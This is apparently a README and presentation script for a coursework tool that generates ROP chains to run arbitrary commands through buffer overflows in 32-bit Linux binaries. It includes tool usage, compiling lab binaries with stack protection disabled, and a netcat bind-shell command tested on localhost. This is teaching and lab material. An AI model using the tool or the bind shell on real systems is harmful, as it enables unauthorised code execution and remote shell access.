This tool can be used for generating ROP chains of arbitrary command lines
Works on x86-32 bit programs with a buffer overflow vulnerability, such as the C strcpy function
Tool can be obtained from the git repo 

FOR THE PURPOSE OF THE TUTORIAL, WE'LL BE USING THE PROVIDED VAGRANTFILE, WHICH RUNS A x86-64 LINUX SYSTEM (tool has not been tested on other systems)

To log into the VM, run:

    vagrant up
    vagrant ssh

The tool and example files can be obtained by cloning https://github.com/navratilj/sss-cw.git

Requirements before using the tool:

    - python3
    - python3-pip
    - gdb
    - gcc-multilib
    - capstone
    - ROPgadget (https://github.com/JonathanSalwan/ROPgadget)

On Linux systems, these can be installed by running:

    sudo apt-get update -y
    sudo apt install -y python3-pip gdb gcc-multilib
    sudo pip3 install capstone
    sudo -H python3 -m pip install ROPgadget

The provided Vagrantfile should automatically install them. If not, run:

    vagrant provision


TOOL USAGE
-------------------------------------------------------------------------

The tool is the "autorun.py" script

To see usage, run:

    python3 autorun.py -h

This will display the tool options and necessary arguments to run
Two arguments are non-optional:

    -b/-bin/--binary --> Path to the vulnerable binary

    -e/-exe/--execute --> Command line you wish to execute.
                          If it contains spaces, make sure to enclose it in ' ' or " "

With no other arguments provided, the tool will produce a ROP chain and put the output into "rop-output". To change the name of the output file, use the -o OUTPUT argument

The -a option automatically runs the produced ROP chain in the binary

The -d DATA_ADDR allows you to set your own .data address

The -g GDB_RUN argument allows you to change the file that gdb will test padding on. This is used for files that have a hard coded name of the file they try to copy from

The -p option skips the gdb step and only produces the ROP chain without padding. Use for files that don't have a simple ./<bin> <file_name> structure

The -badbytes BADBYTES argument enables you to not find gadgets with addresses that contain the badbytes


SHOWCASE EXAMPLE
-------------------------------------------------------------------------
 
Run tmux, on the right side have README open

Log in to the vagrant machine

Clone https://github.com/navratilj/sss-cw.git to obtain autorun.py and lab 3 and 4 files

Compile files using: gcc -fno-stack-protector -m32 -static <file.c> -o <bin> (static for easier finding of gadgets, no protector because tool can't bypass stack canaries)

Show ASLR is on: cat /proc/sys/kernel/randomize_va_space (2 == on)

Show NX is enabled: rabin2 -I <file>

Show usage: python3 autorun.py -h

Run and example command(/bin/sh, ls, ls -a -l, python...) without -a, then run ./<bin> <output>

Run with the -a option to run automatically

Change size of buffer in an example file to show that it works with different buffer size

Run readelf -S <file> to show writeable memory spaces 
Use -d to change to and address that contains a null byte, and explain how it works, but how you would change it if you had more time

Show the -badbytes option to find different gadgets (example: d5, 90, 61)
RUN WITH ROPGADGET TO SHOW THE NEW GADGETS (show the bug in ROP gadget)

Show it works with nc:

    untar 
    ./configure
    make
    cp src/netcat /tmp/nc
    mkdir left_window right_window
    left --> /tmp/nc -lnp 5678 -tte /bin/sh
    right --> /tmp/nc 127.0.0.1 5678
              pwd 

Maybe some more commands

That's all, thank you!